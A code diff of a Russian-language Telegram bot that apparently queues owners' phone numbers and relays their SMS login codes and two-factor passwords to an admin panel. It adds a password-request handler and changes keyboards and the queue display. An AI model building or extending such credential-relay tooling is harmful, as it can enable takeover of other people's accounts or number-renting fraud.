@@ -225,10 +225,7 @@ _CANCEL_KB = InlineKeyboardMarkup(inline_keyboard=[[
 
 _ACTIVE_KB = InlineKeyboardMarkup(inline_keyboard=[
     [InlineKeyboardButton(text="🔢 Код",           callback_data="active:code")],
-    [
-        InlineKeyboardButton(text="✅ Встал",       callback_data="active:met"),
-        InlineKeyboardButton(text="🔑 Пароль",     callback_data="active:password"),
-    ],
+    [InlineKeyboardButton(text="✅ Встал",          callback_data="active:met")],
     [
         InlineKeyboardButton(text="⏩ Скип",        callback_data="active:skip"),
         InlineKeyboardButton(text="🚫 Бан номера",  callback_data="active:ban"),
@@ -238,9 +235,12 @@ _ACTIVE_KB = InlineKeyboardMarkup(inline_keyboard=[
 _PASSWORD_KB = InlineKeyboardMarkup(inline_keyboard=[
     [
         InlineKeyboardButton(text="✅ Встал",  callback_data="password:met"),
-        InlineKeyboardButton(text="🔄 Повтор", callback_data="password:repeat"),
+        InlineKeyboardButton(text="🔑 Пароль", callback_data="password:password"),
     ],
-    [InlineKeyboardButton(text="⏩ Скип",      callback_data="password:skip")],
+    [
+        InlineKeyboardButton(text="🔄 Повтор", callback_data="password:repeat"),
+        InlineKeyboardButton(text="⏩ Скип",   callback_data="password:skip"),
+    ],
 ])
 
 
@@ -755,6 +755,7 @@ async def _request_from_owner(
 async def _forward_code_to_admin(bot: Bot, req: CodeRequest, code: str) -> None:
     """Пересылает полученный код на панель управления админа."""
     global _admin_ctrl_msg_id, _admin_ctrl_chat_id, _password_attempts
+    await _cancel_timer()  # код получен — таймер больше не нужен
     if _password_attempts > 0:
         _password_attempts -= 1
     attempts_note = f"\n⚠️ Осталось повторов: {_password_attempts}" if _password_mode else ""
@@ -1125,20 +1126,19 @@ async def cb_active(callback: CallbackQuery, bot: Bot) -> None:
                 pass
         await _finish_active(bot, reason="met")
 
-    elif action in ("code", "password"):
+    elif action == "code":
         global _password_mode, _password_attempts, _request_kind
         _password_mode     = True
         _password_attempts = 1  # 1 Повтор = 2 попытки суммарно
-        _request_kind      = action
-        label = "🔢 SMS-код" if action == "code" else "🔑 Пароль"
-        await callback.answer(f"{label} — запрос отправлен")
+        _request_kind      = "code"
+        await callback.answer("🔢 SMS-код — запрос отправлен")
         # Только сейчас запускаем таймер и уведомляем владельца
         await _start_code_timer(bot, req)
-        await _request_from_owner(bot, req, attempt=1, kind=action)
+        await _request_from_owner(bot, req, attempt=1, kind="code")
         if isinstance(msg, Message):
             try:
                 await msg.edit_text(
-                    f"📱 Номер: `{req.phone}`\n{label} запрошен у владельца...",
+                    f"📱 Номер: `{req.phone}`\n🔢 SMS-код запрошен у владельца...",
                     parse_mode="Markdown", reply_markup=_PASSWORD_KB,
                 )
             except Exception:
@@ -1183,6 +1183,23 @@ async def cb_password(callback: CallbackQuery, bot: Bot) -> None:
             except Exception:
                 pass
         await _finish_active(bot, reason="met")
+
+    elif action == "password":
+        global _password_mode, _password_attempts, _request_kind
+        _password_mode     = True
+        _password_attempts = 1
+        _request_kind      = "password"
+        await callback.answer("🔑 Пароль — запрос отправлен")
+        await _start_code_timer(bot, req)
+        await _request_from_owner(bot, req, attempt=1, kind="password")
+        if isinstance(msg, Message):
+            try:
+                await msg.edit_text(
+                    f"📱 Номер: `{req.phone}`\n🔑 Пароль запрошен у владельца...",
+                    parse_mode="Markdown", reply_markup=_PASSWORD_KB,
+                )
+            except Exception:
+                pass
 
     elif action == "repeat":
         global _password_mode, _password_attempts
@@ -1367,13 +1384,19 @@ async def cb_queue(callback: CallbackQuery) -> None:
         phones    = owner.phones if owner else []
         in_queue  = sum(1 for r in store.queue if r.owner_id == uid)
         in_active = 1 if store.active and store.active.owner_id == uid else 0
-        lines = [f"📋 *Мои номера в очереди*\n",
-                 f"Всего номеров: *{len(phones)}*\n"]
-        for phone in phones:
-            status = store.phone_status(phone)
-            icon   = "⏳" if status == "active" else ("📥" if status == "queued" else ("🕐" if status == "cooldown" else ("🚫" if status == "banned" else "✅")))
-            lines.append(f"{icon} `{mask_phone(phone)}`")
-        lines.append(f"\nВ очереди: *{in_queue}* · В обработке: *{in_active}*")
+        # Показываем только номера, ожидающие обработки в очереди
+        waiting = [p for p in phones if store.phone_status(p) == "queued"]
+        lines = [
+            f"📋 *Мои номера в очереди*\n",
+            f"Всего номеров: *{len(phones)}* · В очереди: *{in_queue}* · В обработке: *{in_active}*",
+        ]
+        if waiting:
+            lines.append("")
+            for phone in waiting:
+                pos = store.queue_position(phone)
+                lines.append(f"📥 `{mask_phone(phone)}` — позиция *{pos}*")
+        else:
+            lines.append("\n_Нет номеров в ожидании_")
         await _edit_or_answer(msg, "\n".join(lines), parse_mode="Markdown",
                               reply_markup=_QUEUE_KB)
 
